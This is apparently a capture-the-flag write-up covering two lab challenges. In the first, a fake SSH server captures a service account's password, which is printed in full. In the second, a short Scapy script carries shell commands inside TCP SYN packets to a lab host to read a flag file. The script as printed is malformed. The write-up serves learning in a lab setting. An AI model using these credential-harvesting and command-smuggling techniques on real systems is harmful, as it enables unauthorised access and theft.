KnockKnock
=====================================
It was not about attacking, but listening on the laptop.
There was a connection to port 22 from the server 10.13.37.99
Let's install a FakeSSH serveur :
git clone https://github.com/tylermenezes/FakeSSH

sudo pip install paramiko

cd FakeSSH
cp ./data/config.sample.json ./data/config.json
ssh-keygen -f ./data/rsa -m 'PEM' 
set no password

sudo python3 server.py

wait max 10min

![](https://github.com/k4nfr3/CTF-writeup/blob/master/2019-Insomnihack/fakessh_1.jpg)

ssh -l svc-tenable-linux 10.13.37.99
password = $\mx3i#u0@%6d@8fk^&^x*ntw2m

![](https://github.com/k4nfr3/CTF-writeup/blob/master/2019-Insomnihack/fakessh_2.jpg)

==============

Net1


Hint 2 : RFC741x => RFC7413 = Use TCP SYN Data

ok, Let's try some Python Scapy with TCP-Syn Data
- - - - - - - - - 
from scapy.all import *

def main(command):

    while True:<br/>
    
        # build the TCPSYN packet with the command as the payload<br/>
        pinger = IP(dst="10.13.37.98")<br/>
        SYN = TCP(sport=6666, dport=3258, flags='S', seq=1000)<br/>
        xsyn = pinger / SYN / command<br/>
        send(xsyn)<br/>
if __name__ == "__main__":<br/>
    main(ls -la)<br/>
 - - - - - - - - - - - -  
Trying to send some commands but nothing back from the server.

Hint : We got the password "SyN" at 1am

Ok, let's send some commands
main(SyN ls -la)
....
final command : main(SyN cat ./secret/me/not/flag.txt)

to find flag 
![](https://github.com/k4nfr3/CTF-writeup/blob/master/2019-Insomnihack/Net1.jpg)




